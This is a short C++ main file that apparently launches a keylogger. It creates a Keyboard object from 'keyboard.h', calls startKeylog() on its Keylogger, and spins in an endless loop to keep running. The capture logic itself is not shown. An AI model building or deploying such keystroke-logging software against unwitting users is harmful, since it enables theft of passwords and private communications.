#include <iostream>

#include "keyboard.h"

int main() {
	Keyboard keyboard{};
	Keylogger& keylogger = *keyboard.keylogger;

	keylogger.startKeylog();
	while (true) {
		;
	}
	return 0;
}